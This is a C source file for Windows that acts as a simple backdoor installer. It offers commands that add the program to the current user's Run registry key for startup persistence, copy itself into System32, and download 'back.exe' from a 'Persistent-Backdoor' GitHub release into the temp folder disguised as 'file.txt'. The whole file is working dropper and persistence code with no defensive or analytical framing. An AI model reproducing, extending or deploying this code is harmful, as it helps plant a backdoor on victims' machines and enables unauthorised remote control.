#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#pragma comment(lib, "urlmon.lib")

#define REG_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_NAME "MyScript"

void print_commands() {
    printf("Possible commands:\n");
    printf("boot - create registry key to run the script on startup\n");
    printf("copy - copy the script to System32\n");
    printf("download - download a file from a URL defined in the script\n");
}

void create_registry_key() {
    HKEY hkey;
    if (RegOpenKey(HKEY_CURRENT_USER, REG_KEY, &hkey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);
        RegSetValueEx(hkey, REG_NAME, 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hkey);
        printf("Created registry key to run the script on startup.\n");
    } else {
        printf("Failed to create registry key.\n");
    }
}

void copy_to_system32() {
    char source_path[MAX_PATH];
    char dest_path[MAX_PATH];
    GetModuleFileName(NULL, source_path, MAX_PATH);
    sprintf(dest_path, "C:\\Windows\\System32\\%s", strrchr(source_path, '\\') + 1);
    if (CopyFile(source_path, dest_path, FALSE)) {
        printf("Copied the script to System32.\n");
    } else {
        printf("Failed to copy the script to System32.\n");
    }
}

void download_file() {
    char url[] = "https://github.com/PolGs/Persistent-Backdoor/releases/download/0.12/back.exe";
    char dest_path[MAX_PATH];
    GetTempPath(MAX_PATH, dest_path);
    strcat(dest_path, "file.txt");
    if (URLDownloadToFile(NULL, url, dest_path, 0, NULL) == S_OK) {
        printf("Downloaded a file from a URL.\n");
    } else {
        printf("Failed to download a file from a URL.\n");
    }
}

int main() {
    char input[256];
    while (1) {
        print_commands();
        printf("Enter a command: ");
        fgets(input, sizeof(input), stdin);
        if (strcmp(input, "boot\n") == 0) {
            create_registry_key();
        } else if (strcmp(input, "copy\n") == 0) {
            copy_to_system32();
        } else if (strcmp(input, "download\n") == 0) {
            download_file();
        } else {
            printf("Invalid command.\n");
        }
    }
    return 0;
}
